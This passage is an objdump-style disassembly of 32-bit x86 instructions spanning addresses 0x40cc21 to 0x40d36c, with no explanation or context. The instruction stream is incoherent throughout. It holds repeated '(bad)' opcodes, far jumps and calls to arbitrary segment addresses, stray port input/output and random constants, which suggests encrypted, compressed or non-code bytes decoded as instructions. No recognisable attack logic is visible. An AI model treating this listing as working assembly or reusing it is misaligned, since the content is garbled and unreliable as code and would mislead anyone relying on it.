  40cc21:	iret   
  40cc22:	fst    QWORD PTR [esi+ecx*2+0x600c6bfb]
  40cc29:	mov    ds,WORD PTR [eax+0x22]
  40cc2c:	cmp    eax,0x32374e49
  40cc31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc32:	and    DWORD PTR [edi+0x77],ebp
  40cc35:	pop    ecx
  40cc36:	sar    dl,0x1c
  40cc39:	cmp    dl,BYTE PTR [ebx]
  40cc3b:	popa   
  40cc3c:	retf   0xcc2d
  40cc3f:	sub    al,0x76
  40cc41:	pop    ds
  40cc42:	mov    esi,0x8e82253b
  40cc47:	push   ecx
  40cc48:	xor    DWORD PTR [esi],0x4289567c
  40cc4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc4f:	and    BYTE PTR [ebp-0x5b],cl
  40cc52:	mov    eax,DWORD PTR [ecx+eax*2-0x69]
  40cc56:	jbe    0x40cbe1
  40cc58:	test   eax,0x4e46f761
  40cc5d:	repnz xchg ebx,eax
  40cc5f:	cmp    eax,0x651caf0
  40cc64:	fucomip st,st(4)
  40cc66:	pop    esi
  40cc67:	test   DWORD PTR [esi-0x55],ebx
  40cc6a:	loopne 0x40cce2
  40cc6c:	mov    esp,0x38afbeba
  40cc71:	add    eax,0xf1442964
  40cc76:	and    BYTE PTR [ebx+0x2e],0xbb
  40cc7a:	fldenv [edi+eiz*1]
  40cc7d:	repnz mov eax,0xe62d215c
  40cc83:	xor    ebp,ebp
  40cc85:	adc    DWORD PTR [esi+0x55835911],0x7f
  40cc8c:	jl     0x40cce6
  40cc8e:	push   esi
  40cc8f:	or     BYTE PTR [edi],ch
  40cc91:	loope  0x40cc99
  40cc93:	sahf   
  40cc94:	fs jb  0x40cc7d
  40cc97:	mov    gs,WORD PTR [eax-0x44]
  40cc9a:	aaa    
  40cc9b:	push   ss
  40cc9c:	loope  0x40ccaa
  40cc9e:	xchg   esp,eax
  40cc9f:	push   es
  40cca0:	addr16 aam 0xe3
  40cca3:	jmp    0x4519:0x67542eb6
  40ccaa:	(bad)  
  40ccab:	inc    BYTE PTR [esi]
  40ccad:	dec    ecx
  40ccae:	mov    ds:0x6dae75fd,eax
  40ccb3:	add    DWORD PTR [edi+edx*2],ebp
  40ccb6:	pop    esp
  40ccb7:	push   esp
  40ccb8:	mov    ecx,0xef93e4eb
  40ccbd:	cmp    BYTE PTR [di+0x6e],bl
  40ccc1:	sar    ebp,0x12
  40ccc4:	jp     0x40cca3
  40ccc6:	test   al,bl
  40ccc8:	imul   esp,DWORD PTR [edi-0x1e],0xffffff9a
  40cccc:	jmp    0xfc2983a4
  40ccd1:	and    al,0x91
  40ccd3:	inc    edi
  40ccd4:	sub    bh,BYTE PTR [esi-0x73]
  40ccd7:	and    ebx,esp
  40ccd9:	shld   DWORD PTR [edx-0x722f95dd],edx,0xb7
  40cce1:	popa   
  40cce2:	cmp    eax,0x95e28b32
  40cce7:	stc    
  40cce8:	pop    ds
  40cce9:	scas   eax,DWORD PTR es:[edi]
  40ccea:	push   ecx
  40cceb:	jge    0x40cc86
  40cced:	ja     0x40ccaa
  40ccef:	sbb    al,0x5f
  40ccf1:	xchg   ebx,eax
  40ccf2:	push   esi
  40ccf3:	xchg   edx,eax
  40ccf4:	jge    0x40cd52
  40ccf6:	pop    ecx
  40ccf7:	sbb    DWORD PTR [esi-0xde9554],edx
  40ccfd:	cwde   
  40ccfe:	pop    ebp
  40ccff:	out    0x74,al
  40cd01:	or     cl,BYTE PTR [esi]
  40cd03:	scas   eax,DWORD PTR es:[edi]
  40cd04:	stos   DWORD PTR es:[edi],eax
  40cd05:	mov    ah,0x53
  40cd07:	fld    DWORD PTR [ebp+0x45]
  40cd0a:	data16 fbstp TBYTE PTR [esi+esi*1-0x784e3177]
  40cd12:	lods   eax,DWORD PTR ds:[esi]
  40cd13:	les    esi,FWORD PTR [edx-0x7314f94a]
  40cd19:	push   ds
  40cd1a:	xchg   ecx,eax
  40cd1b:	dec    esi
  40cd1c:	mov    esi,0xe3768785
  40cd21:	mov    al,ds:0xa964355d
  40cd26:	loope  0x40ccdd
  40cd28:	lock call 0x58d2:0xc36fb21e
  40cd30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd31:	pop    ecx
  40cd32:	cdq    
  40cd33:	jo     0x40cd9e
  40cd35:	xor    ebx,DWORD PTR [edx+0x64aabe63]
  40cd3b:	aaa    
  40cd3c:	nop    DWORD PTR [ebx-0x5f]
  40cd40:	stos   DWORD PTR es:[edi],eax
  40cd41:	dec    ebp
  40cd42:	ss in  eax,0xc3
  40cd45:	mov    esp,0x644a3be8
  40cd4a:	cli    
  40cd4b:	das    
  40cd4c:	pop    edx
  40cd4d:	fld    DWORD PTR [ebx+0x5e]
  40cd50:	cld    
  40cd51:	js     0x40cd5d
  40cd53:	jmp    0x40ccf1
  40cd55:	sbb    BYTE PTR [ecx-0x5e],0x8c
  40cd59:	inc    ecx
  40cd5a:	out    0x72,al
  40cd5c:	cmp    al,0x1b
  40cd5e:	ret    0x19a1
  40cd61:	idiv   cl
  40cd63:	sub    ecx,DWORD PTR [ebp-0xc759b85]
  40cd69:	pop    ss
  40cd6a:	ss and eax,0x2b71aef3
  40cd70:	js     0x40cd75
  40cd72:	jge    0x40cdba
  40cd74:	push   eax
  40cd75:	add    DWORD PTR [esi+eiz*1-0x24],eax
  40cd79:	add    al,0x56
  40cd7b:	add    BYTE PTR [ecx],ah
  40cd7d:	and    esp,DWORD PTR [ebx]
  40cd7f:	lea    ebp,[ebp+0x5b]
  40cd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd83:	cmp    al,0x1c
  40cd85:	test   al,0xae
  40cd87:	in     eax,dx
  40cd88:	fld    DWORD PTR [edi+0x16]
  40cd8b:	jno    0x40cd38
  40cd8d:	dec    esi
  40cd8e:	out    dx,eax
  40cd8f:	jp     0x40cdd5
  40cd91:	or     BYTE PTR [eax-0x1d],dh
  40cd94:	sub    ah,cl
  40cd96:	mov    ecx,0x58469e5d
  40cd9b:	xor    BYTE PTR [edx-0x46],dl
  40cd9e:	aad    0x40
  40cda0:	in     al,0xff
  40cda2:	mov    edx,0xc7fe520
  40cda7:	lock mov ch,0xb9
  40cdaa:	and    edi,DWORD PTR [ebx]
  40cdac:	lods   eax,DWORD PTR ds:[esi]
  40cdad:	pop    es
  40cdae:	aam    0x18
  40cdb0:	jle    0x40cd73
  40cdb2:	sbb    al,0xf5
  40cdb4:	inc    esi
  40cdb5:	cmp    DWORD PTR [edi],edi
  40cdb7:	ja     0x40cdd8
  40cdb9:	sti    
  40cdba:	push   0x31
  40cdbc:	mov    al,ds:0x57b74b7d
  40cdc1:	scas   al,BYTE PTR es:[edi]
  40cdc2:	je     0x40cdd3
  40cdc4:	adc    eax,0x4833ec5e
  40cdc9:	and    DWORD PTR [eax],esi
  40cdcb:	jnp    0x40cda1
  40cdcd:	je     0x40cd6f
  40cdcf:	int3   
  40cdd0:	mov    esp,edi
  40cdd2:	xchg   esi,eax
  40cdd3:	and    ebp,DWORD PTR [eax+0x1a]
  40cdd6:	dec    esi
  40cdd7:	mov    cl,0x1b
  40cdd9:	jle    0x40ce3f
  40cddb:	cld    
  40cddc:	push   ebp
  40cddd:	ds loopne 0x40cd94
  40cde0:	pusha  
  40cde1:	div    ch
  40cde3:	imul   edi,DWORD PTR [edi-0x61a1743c],0x17
  40cdea:	and    edi,DWORD PTR ds:0x76d478d4
  40cdf0:	adc    BYTE PTR [edx],0x41
  40cdf3:	test   BYTE PTR [ecx],0x70
  40cdf6:	dec    ecx
  40cdf7:	pop    ecx
  40cdf8:	sub    esi,DWORD PTR [ecx-0x1066765e]
  40cdfe:	shl    BYTE PTR [ecx+edx*1+0x33],cl
  40ce02:	ffree  st(7)
  40ce04:	pop    ds
  40ce05:	pusha  
  40ce06:	sti    
  40ce07:	lea    edx,[edx+eiz*2]
  40ce0a:	push   0xffffff87
  40ce0c:	sub    BYTE PTR [ebx-0x442eea3c],bh
  40ce12:	add    DWORD PTR [edi-0x40],0x22
  40ce16:	push   edx
  40ce17:	add    ecx,ebp
  40ce19:	dec    edi
  40ce1a:	ror    BYTE PTR [edx],0x6c
  40ce1d:	and    al,0xfb
  40ce1f:	push   es
  40ce20:	sahf   
  40ce21:	daa    
  40ce22:	dec    edi
  40ce23:	xchg   edx,eax
  40ce24:	cmp    ebx,esp
  40ce26:	jnp    0x40ce09
  40ce28:	sti    
  40ce29:	xor    al,0xf6
  40ce2b:	js     0x40ce41
  40ce2d:	scas   al,BYTE PTR es:[edi]
  40ce2e:	jo     0x40ce57
  40ce30:	sub    esp,DWORD PTR [ebp-0x317b881d]
  40ce36:	call   0x27451746
  40ce3b:	add    al,0x77
  40ce3d:	mov    ebx,0x7282754d
  40ce42:	out    dx,eax
  40ce43:	ficomp WORD PTR [ebp-0x240f48c7]
  40ce49:	cmp    bl,BYTE PTR [eax+ebp*2+0x1a6f2cce]
  40ce50:	mov    al,0x7b
  40ce52:	test   DWORD PTR [esi+0xf],ebp
  40ce55:	inc    eax
  40ce56:	scas   eax,DWORD PTR es:[edi]
  40ce57:	push   0x1ebdc94b
  40ce5c:	push   edi
  40ce5d:	dec    ebx
  40ce5e:	lds    edi,FWORD PTR [ebx-0x197fef6f]
  40ce64:	cmc    
  40ce65:	inc    edx
  40ce66:	add    cl,BYTE PTR ds:0x9f1b9819
  40ce6c:	and    edx,ebp
  40ce6e:	mov    ebx,0x8aeed201
  40ce73:	fcomp  DWORD PTR [ecx+0x65]
  40ce76:	push   ebx
  40ce77:	das    
  40ce78:	add    BYTE PTR [edi],0x3f
  40ce7b:	shl    DWORD PTR cs:[edx-0x77],0x91
  40ce80:	mov    al,ds:0x2154ace9
  40ce85:	and    al,0xb
  40ce87:	jnp    0x40cee1
  40ce89:	aas    
  40ce8a:	rol    DWORD PTR [ebp+0x3b1d76ca],0xd9
  40ce91:	push   es
  40ce92:	ss jge 0x40ce70
  40ce95:	ror    BYTE PTR [ecx-0x6ebbae52],1
  40ce9b:	cmc    
  40ce9c:	push   ebp
  40ce9d:	xor    BYTE PTR [edx-0x4a],cl
  40cea0:	jmp    0x2bd2:0xd8a33eb7
  40cea7:	mov    ch,0x41
  40cea9:	jge    0x40cefc
  40ceab:	and    dh,BYTE PTR [eax+0x48]
  40ceae:	and    eax,0x62984c14
  40ceb3:	mov    dl,0x86
  40ceb5:	xor    eax,0xbefe1561
  40ceba:	in     al,dx
  40cebb:	jb     0x40ceef
  40cebd:	add    cl,ch
  40cebf:	jg     0x40cee4
  40cec1:	add    BYTE PTR [eax],al
  40cec3:	mov    cs:0xd0afdcaf,eax
  40cec9:	add    DWORD PTR [ebx+0x287882c5],eax
  40cecf:	aas    
  40ced0:	call   0xcdee6315
  40ced5:	jp     0x40cf51
  40ced7:	adc    ebx,DWORD PTR [edi+0x7a]
  40ceda:	jp     0x40cf40
  40cedc:	les    ecx,FWORD PTR [ecx]
  40cede:	cmp    DWORD PTR [edx+0x72fb2ca3],ebp
  40cee4:	mov    DWORD PTR [ecx+0x59e8e568],esi
  40ceea:	sbb    esp,edi
  40ceec:	sub    al,0xce
  40ceee:	es sub al,0xa
  40cef1:	dec    edi
  40cef2:	mov    ebx,0xc229b85d
  40cef7:	pushf  
  40cef8:	es das 
  40cefa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cefb:	out    0x82,al
  40cefd:	sub    eax,0x3051dbcb
  40cf02:	loop   0x40ce8b
  40cf04:	ds gs hlt 
  40cf07:	mov    bh,0xbe
  40cf09:	ficom  WORD PTR [ecx-0x30]
  40cf0c:	sub    cl,BYTE PTR [ecx]
  40cf0e:	ffree  st(0)
  40cf10:	dec    edi
  40cf11:	and    al,0x3d
  40cf13:	jnp    0x40cf0e
  40cf15:	popf   
  40cf16:	or     eax,0xf9b3c044
  40cf1b:	adc    ch,dl
  40cf1d:	loope  0x40cea9
  40cf1f:	pop    ecx
  40cf20:	cld    
  40cf21:	jle    0x40cf60
  40cf23:	in     eax,0x8
  40cf25:	mov    BYTE PTR cs:[ecx+0x39f9ad98],al
  40cf2c:	cmp    BYTE PTR [ebp+0x29828197],bh
  40cf32:	xchg   edx,eax
  40cf33:	call   0x9a7e:0x7c7cb810
  40cf3a:	jmp    0xfedf:0x50f81112
  40cf41:	hlt    
  40cf42:	xlat   BYTE PTR ds:[ebx]
  40cf43:	cmp    ecx,eax
  40cf45:	xchg   ecx,eax
  40cf46:	call   0x46728ac9
  40cf4b:	aam    0x57
  40cf4d:	test   DWORD PTR [ebp-0x57],ebp
  40cf50:	into   
  40cf51:	pop    edi
  40cf52:	pushf  
  40cf53:	ins    DWORD PTR es:[edi],dx
  40cf54:	pop    ds
  40cf55:	and    eax,0x3592cb
  40cf5a:	mov    eax,ds:0x8eb5a92d
  40cf5f:	dec    ebp
  40cf60:	push   esi
  40cf61:	jecxz  0x40cef8
  40cf63:	push   0x28
  40cf65:	call   0x5fa7:0x4d61a38a
  40cf6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf6d:	imul   esp,DWORD PTR [eax+eax*8],0xfe356235
  40cf74:	mov    ah,0xe0
  40cf76:	fwait
  40cf77:	push   ebx
  40cf78:	adc    BYTE PTR [eax-0x7a85580d],dh
  40cf7e:	push   es
  40cf7f:	sub    eax,ebp
  40cf81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf82:	retf   0xa455
  40cf85:	sbb    DWORD PTR [ebx+ecx*4],ebx
  40cf88:	push   esi
  40cf89:	xchg   esp,eax
  40cf8a:	or     esp,eax
  40cf8c:	sub    DWORD PTR [ecx+0x14],ecx
  40cf8f:	mov    al,0x96
  40cf91:	loop   0x40d00b
  40cf93:	fld    DWORD PTR [eax]
  40cf95:	clc    
  40cf96:	xor    ah,BYTE PTR [ebp-0x2e]
  40cf99:	xor    DWORD PTR [esi],ebp
  40cf9b:	adc    al,0xb2
  40cf9d:	pop    eax
  40cf9e:	test   BYTE PTR [eax-0x6a],ah
  40cfa1:	call   0x124a:0xc63932d0
  40cfa8:	mov    ch,0xc7
  40cfaa:	cli    
  40cfab:	mov    ecx,DWORD PTR [eax-0x4c45db5d]
  40cfb1:	xor    BYTE PTR [eax-0x3cd1875d],bh
  40cfb7:	jbe    0x40cfb7
  40cfb9:	cmp    DWORD PTR [ecx-0x62],edx
  40cfbc:	push   esi
  40cfbd:	pushf  
  40cfbe:	(bad)  
  40cfc0:	xchg   edi,eax
  40cfc1:	add    al,0xff
  40cfc3:	aad    0x96
  40cfc5:	xor    DWORD PTR [edx],ebx
  40cfc7:	int3   
  40cfc8:	or     eax,0xb27932cd
  40cfcd:	lds    esi,FWORD PTR [eax+0x3c652eeb]
  40cfd3:	add    al,0xf5
  40cfd5:	int    0xe3
  40cfd7:	pop    edx
  40cfd8:	stos   BYTE PTR es:[edi],al
  40cfd9:	in     eax,dx
  40cfda:	repnz xor bl,BYTE PTR [edx]
  40cfdd:	ja     0x40d038
  40cfdf:	pop    ecx
  40cfe0:	ffree  st(0)
  40cfe2:	std    
  40cfe3:	mov    DWORD PTR [eax+0x38f1f5eb],ebx
  40cfe9:	or     ebx,edx
  40cfeb:	adc    edi,edi
  40cfed:	jecxz  0x40cf8b
  40cfef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cff0:	out    0xc,al
  40cff2:	sub    dh,BYTE PTR [ecx+ebp*1+0x29]
  40cff6:	cli    
  40cff7:	jge    0x40cfcb
  40cff9:	in     eax,0xff
  40cffb:	dec    ebp
  40cffc:	les    ebp,FWORD PTR [edi-0x53]
  40cfff:	or     al,0x4f
  40d001:	out    dx,al
  40d002:	inc    edx
  40d003:	mov    edx,edi
  40d005:	sbb    al,0x43
  40d007:	ja     0x40cfde
  40d009:	push   cs
  40d00a:	sbb    al,0x88
  40d00c:	xor    al,0x36
  40d00e:	jne    0x40cfd0
  40d010:	sti    
  40d011:	dec    ecx
  40d012:	movnti DWORD PTR gs:[edx-0x1],eax
  40d017:	rcr    ecx,0x2f
  40d01a:	push   0x73
  40d01c:	add    ch,BYTE PTR [esi]
  40d01e:	xor    BYTE PTR ds:0x913b77be,bh
  40d024:	mov    eax,ds:0x55a048e2
  40d029:	imul   ebx,DWORD PTR [ebx+esi*8+0x383cb4c1],0x3b5c9b33
  40d034:	jp     0x40d04c
  40d036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d037:	cmovle esp,ebx
  40d03a:	inc    ecx
  40d03b:	shr    DWORD PTR [edi+ebx*4+0x4183930f],cl
  40d042:	push   esp
  40d043:	jbe    0x40d0bc
  40d045:	mov    cl,0xfd
  40d047:	mov    esp,0xfcf0e507
  40d04c:	in     eax,dx
  40d04d:	cmp    DWORD PTR [edi+ebp*8-0x71646779],esi
  40d054:	in     al,0x57
  40d056:	mov    gs,esi
  40d058:	jecxz  0x40d019
  40d05a:	push   ds
  40d05b:	or     al,0x91
  40d05d:	pop    ds
  40d05e:	and    DWORD PTR [eax],eax
  40d060:	xlat   BYTE PTR ds:[ebx]
  40d061:	mov    al,0xfe
  40d063:	pop    DWORD PTR [ebp-0x4f69e595]
  40d069:	out    dx,eax
  40d06a:	scas   eax,DWORD PTR es:[edi]
  40d06b:	aam    0xcd
  40d06d:	mov    ch,0x1e
  40d06f:	inc    edi
  40d070:	enter  0x2145,0xcb
  40d074:	mov    cl,0x28
  40d076:	and    ebx,edi
  40d078:	dec    edi
  40d079:	aas    
  40d07a:	adc    bl,BYTE PTR [esi]
  40d07c:	xor    BYTE PTR [esi-0x7740210],0x49
  40d083:	mov    esi,0x820f81fd
  40d088:	mov    bl,0x29
  40d08a:	pop    ebx
  40d08b:	(bad)  
  40d08c:	leave  
  40d08d:	adc    DWORD PTR [eax-0x17],ebx
  40d090:	sub    DWORD PTR [esi+0x6ce91b57],ebx
  40d096:	dec    eax
  40d097:	int3   
  40d098:	push   0x83bcb419
  40d09d:	cmp    DWORD PTR [edi-0x4ef890dd],esi
  40d0a3:	imul   eax,DWORD PTR [ebp+0x77750adb],0xffffff94
  40d0aa:	mov    bl,0xd2
  40d0ac:	sub    esp,DWORD PTR [edi+0xa25dc4e]
  40d0b2:	push   ebp
  40d0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b4:	dec    edi
  40d0b5:	inc    esi
  40d0b6:	push   edx
  40d0b7:	lahf   
  40d0b8:	dec    ebx
  40d0b9:	mov    bh,0x3
  40d0bb:	retf   0xa441
  40d0be:	mov    bh,0x95
  40d0c0:	add    eax,0x142f80ea
  40d0c5:	dec    esi
  40d0c6:	jno    0x40d0dc
  40d0c8:	popa   
  40d0c9:	xor    dh,BYTE PTR [ecx+0x18]
  40d0cc:	and    eax,0x596d3213
  40d0d1:	pusha  
  40d0d2:	pop    ecx
  40d0d3:	scas   al,BYTE PTR es:[edi]
  40d0d4:	push   edx
  40d0d5:	rcl    DWORD PTR [ebx-0x4d],cl
  40d0d8:	add    dl,BYTE PTR [eax-0x5d]
  40d0db:	jne    0x40d0e8
  40d0dd:	mov    al,ds:0x946f7393
  40d0e2:	push   ecx
  40d0e3:	xchg   ebx,eax
  40d0e4:	mov    bl,0xcd
  40d0e6:	mov    eax,ds:0xd6d01bc3
  40d0eb:	and    DWORD PTR [bx+si],edi
  40d0ee:	sub    DWORD PTR [ecx+esi*4-0x39],ecx
  40d0f2:	and    DWORD PTR ds:0xe9243140,0xffffffa6
  40d0f9:	inc    esp
  40d0fa:	imul   ebx,eax,0xffffff97
  40d0fd:	jge    0x40d12f
  40d0ff:	xor    BYTE PTR [esi],ch
  40d101:	lods   eax,DWORD PTR ds:[esi]
  40d102:	int    0x66
  40d104:	scas   eax,DWORD PTR es:[edi]
  40d105:	push   edi
  40d106:	lea    edx,[edx]
  40d108:	jp     0x40d0f8
  40d10a:	test   BYTE PTR [esi],cl
  40d10c:	push   edx
  40d10d:	push   esi
  40d10e:	xchg   ebp,esi
  40d110:	and    dh,0x8a
  40d113:	jge    0x40d127
  40d115:	mov    edx,0x65ae0b3c
  40d11a:	out    0xb6,al
  40d11c:	enter  0x6167,0x27
  40d120:	jl     0x40d0a6
  40d122:	das    
  40d123:	mov    ah,0xef
  40d125:	add    DWORD PTR [esi-0x3],ecx
  40d128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d129:	out    0x90,al
  40d12b:	add    BYTE PTR [ecx+0x30da2a3b],bl
  40d131:	mov    ds:0xe3c70dc8,eax
  40d136:	xor    esp,DWORD PTR [eiz*2+0x6ac4f87e]
  40d13d:	adc    ch,BYTE PTR [eax-0x12]
  40d140:	aam    0x99
  40d142:	mov    ss,WORD PTR [esp+ebp*1]
  40d145:	sbb    DWORD PTR [ebx],eax
  40d147:	(bad)  [esi-0x742174e6]
  40d14d:	jb     0x40d1b8
  40d14f:	jmp    0x9663a1f
  40d154:	scas   al,BYTE PTR es:[edi]
  40d155:	les    ecx,FWORD PTR [ebp+0x1e]
  40d158:	cli    
  40d159:	or     al,0x18
  40d15b:	or     eax,0x55680925
  40d160:	test   eax,0x9227ba83
  40d165:	mov    bl,0x55
  40d167:	push   edi
  40d168:	pop    eax
  40d169:	mov    ds:0xa7db994c,al
  40d16e:	push   ebx
  40d16f:	nop
  40d170:	sbb    esp,eax
  40d172:	mov    al,ds:0x19682a0e
  40d177:	scas   al,BYTE PTR es:[edi]
  40d178:	sbb    eax,0x913474eb
  40d17d:	stc    
  40d17e:	ret    
  40d17f:	cmp    al,0x8d
  40d181:	xor    cl,BYTE PTR [edx-0xe244e2a]
  40d187:	add    al,0x7c
  40d189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d18a:	ja     0x40d1b9
  40d18c:	inc    eax
  40d18d:	(bad)  
  40d18e:	stc    
  40d18f:	fisttp WORD PTR [eax]
  40d191:	(bad)  
  40d192:	aas    
  40d193:	loop   0x40d1a3
  40d195:	xchg   esi,eax
  40d196:	call   0x7340:0xa15641c1
  40d19d:	retf   
  40d19e:	fistp  QWORD PTR [esi]
  40d1a0:	or     ah,BYTE PTR [ecx+ebp*8-0x58a33d7c]
  40d1a7:	cmp    ah,BYTE PTR [ecx+0x68]
  40d1aa:	pop    ss
  40d1ab:	scas   al,BYTE PTR es:[edi]
  40d1ac:	lahf   
  40d1ad:	sub    eax,0x28d3a188
  40d1b2:	cmp    ch,bh
  40d1b4:	push   edi
  40d1b5:	test   edx,0x8b44afc1
  40d1bb:	(bad)
  40d1bf:	pop    ebp
  40d1c0:	mov    eax,0x4a6c671b
  40d1c5:	in     al,dx
  40d1c6:	call   0x925d76bc
  40d1cb:	mov    ebx,0xda5f4175
  40d1d0:	mov    dh,0xa2
  40d1d2:	retf   0x5c6b
  40d1d5:	aaa    
  40d1d6:	je     0x40d1ca
  40d1d8:	mov    edx,0xd2f68487
  40d1dd:	rol    edi,1
  40d1df:	enter  0x9cfb,0x3e
  40d1e3:	mov    cl,0xc8
  40d1e5:	out    dx,eax
  40d1e6:	ret    0xcfb6
  40d1e9:	push   0x264d4daa
  40d1ee:	inc    edx
  40d1ef:	test   DWORD PTR [ebp+0x46ba6f5f],ebx
  40d1f5:	inc    ebp
  40d1f6:	int    0xf7
  40d1f8:	jo     0x40d225
  40d1fa:	xchg   ecx,eax
  40d1fb:	mov    eax,0x17d4d5b7
  40d200:	int    0xa5
  40d202:	jge    0x40d264
  40d204:	rcr    DWORD PTR [eax-0x2ca34d5c],0xfb
  40d20b:	cmp    ebp,DWORD PTR [edx+ebp*1+0x26]
  40d20f:	or     al,0xe0
  40d211:	ja     0x40d28e
  40d213:	jbe    0x40d209
  40d215:	pop    ebp
  40d216:	(bad)  
  40d217:	rcr    dl,0x48
  40d21a:	jl     0x40d1fa
  40d21c:	rcl    DWORD PTR [esi+0x2],cl
  40d21f:	jbe    0x40d1bd
  40d221:	mov    ds:0xb3aad5d5,eax
  40d226:	lea    edi,[eax]
  40d228:	int    0x9
  40d22a:	add    al,0x76
  40d22d:	popa   
  40d22e:	arpl   di,cx
  40d230:	je     0x40d293
  40d232:	dec    eax
  40d233:	dec    eax
  40d234:	and    ah,BYTE PTR [esi-0x5e]
  40d237:	iret   
  40d238:	sub    esp,ebx
  40d23a:	mov    ah,0x3b
  40d23c:	jg     0x40d2b6
  40d23e:	iret   
  40d23f:	out    0x54,eax
  40d241:	outs   dx,BYTE PTR ds:[esi]
  40d242:	push   0xc7910c20
  40d247:	xor    esi,esp
  40d249:	pop    esi
  40d24a:	cmp    ch,BYTE PTR [edx+0x42]
  40d24d:	(bad)  
  40d24e:	sub    ebp,edx
  40d250:	mov    cs,WORD PTR [edi+0x474d6c84]
  40d256:	sub    BYTE PTR [edx+0x3d04724],ch
  40d25c:	xor    eax,0x5a871bd
  40d261:	lahf   
  40d262:	out    0x86,eax
  40d264:	push   ebp
  40d265:	inc    DWORD PTR [ebx+ecx*8]
  40d268:	js     0x40d263
  40d26a:	lods   eax,DWORD PTR ds:[esi]
  40d26b:	aaa    
  40d26c:	xor    al,0xbb
  40d26e:	bound  edi,QWORD PTR [esi+0x59]
  40d271:	jp     0x40d258
  40d273:	or     esp,edx
  40d275:	sub    al,0x51
  40d277:	shr    BYTE PTR [ebx-0x22],1
  40d27a:	lea    edx,[eax+0x71]
  40d27d:	pop    ebp
  40d27e:	sub    DWORD PTR [edi+0x1b],0xa65324c0
  40d285:	ja     0x40d2ea
  40d287:	test   al,0x55
  40d289:	sbb    al,0xe1
  40d28b:	hlt    
  40d28c:	jno    0x40d2a9
  40d28e:	sub    ebp,ebx
  40d290:	daa    
  40d291:	outs   dx,BYTE PTR ds:[esi]
  40d292:	out    0x1a,al
  40d294:	int3   
  40d295:	sub    bh,BYTE PTR [edx+ebp*8+0x69d7f13a]
  40d29c:	sar    DWORD PTR [ebp-0x27],0x99
  40d2a0:	test   DWORD PTR [edi+ebx*2],edx
  40d2a3:	fcom   DWORD PTR es:[eax+esi*4-0x6a]
  40d2a8:	xchg   ecx,eax
  40d2a9:	cs dec edx
  40d2ab:	sub    eax,0xb48a8f01
  40d2b0:	ds jge 0x40d25d
  40d2b3:	shr    DWORD PTR [ebp+0x718575c9],0x5d
  40d2ba:	sar    bl,cl
  40d2bc:	and    dh,BYTE PTR [edx]
  40d2be:	push   0x3e
  40d2c0:	xchg   dh,dl
  40d2c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2c3:	dec    esi
  40d2c4:	fs inc esi
  40d2c6:	xor    BYTE PTR [edi+0x1b],bh
  40d2c9:	or     al,0x8f
  40d2cb:	nop
  40d2cc:	ins    DWORD PTR es:[edi],dx
  40d2cd:	inc    ebx
  40d2ce:	pop    edx
  40d2cf:	cmp    ebp,DWORD PTR [edx]
  40d2d1:	or     DWORD PTR [esi-0x35],edx
  40d2d4:	cld    
  40d2d5:	dec    edi
  40d2d6:	adc    al,0x8d
  40d2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2d9:	xlat   BYTE PTR ds:[ebx]
  40d2da:	ja     0x40d263
  40d2dc:	pushf  
  40d2dd:	into   
  40d2de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2df:	fdivr  DWORD PTR [esi]
  40d2e1:	adc    eax,DWORD PTR [eax+0xe]
  40d2e4:	out    0xc8,al
  40d2e6:	js     0x40d362
  40d2e8:	daa    
  40d2e9:	ss pusha 
  40d2eb:	mov    al,ds:0x719f1f3e
  40d2f0:	dec    eax
  40d2f1:	scas   al,BYTE PTR es:[edi]
  40d2f2:	leave  
  40d2f3:	xchg   ecx,eax
  40d2f4:	test   eax,0x29d1d873
  40d2f9:	(bad)  
  40d2fa:	push   esp
  40d2fb:	pop    ebx
  40d2fc:	xchg   ebx,eax
  40d2fe:	imul   edi,DWORD PTR [ecx],0xffffffb7
  40d301:	push   0x33cf1f2a
  40d306:	pop    edx
  40d307:	iret   
  40d308:	cmp    cl,BYTE PTR [eax-0x23]
  40d30b:	cmp    DWORD PTR [ebp+0x80fea15],eax
  40d311:	push   ds
  40d312:	pop    edx
  40d313:	adc    al,0x86
  40d315:	lods   eax,DWORD PTR ds:[esi]
  40d316:	cmp    cl,BYTE PTR [eax]
  40d318:	stc    
  40d319:	xchg   esp,eax
  40d31a:	or     BYTE PTR [esi],al
  40d31c:	and    edx,DWORD PTR [esi]
  40d31e:	jbe    0x40d37f
  40d320:	test   al,0xa8
  40d322:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40d324:	adc    edx,edi
  40d326:	xchg   esp,eax
  40d327:	xchg   ecx,eax
  40d328:	lds    edi,FWORD PTR [edi+esi*2+0x3b]
  40d32c:	(bad)
  40d32f:	rol    BYTE PTR [edx+0x73],1
  40d332:	fidivr DWORD PTR [esi+ebx*8+0x6]
  40d336:	jb     0x40d2f2
  40d338:	mov    esi,0xf192f61d
  40d33d:	mov    WORD PTR [eax+0x6c],gs
  40d340:	jns    0x40d2d5
  40d342:	push   es
  40d343:	fistp  DWORD PTR [edx-0xa]
  40d346:	cmp    eax,DWORD PTR [ebp+0x65]
  40d349:	das    
  40d34a:	mov    ch,0xdc
  40d34c:	xor    bh,BYTE PTR [eax]
  40d34e:	test   DWORD PTR [ecx],eax
  40d350:	push   ebx
  40d351:	fisttp QWORD PTR [esp+esi*1-0x6b]
  40d355:	aad    0xe6
  40d357:	ja     0x40d36e
  40d359:	jl     0x40d303
  40d35b:	ds dec esp
  40d35d:	clc    
  40d35e:	jmp    0x40d2e7
  40d360:	mov    ecx,0xba9e492f
  40d365:	and    al,0xfc
  40d367:	or     dh,ah
  40d369:	scas   al,BYTE PTR es:[edi]
  40d36a:	loope  0x40d2ed
  40d36c:	jmp    0xf8608607
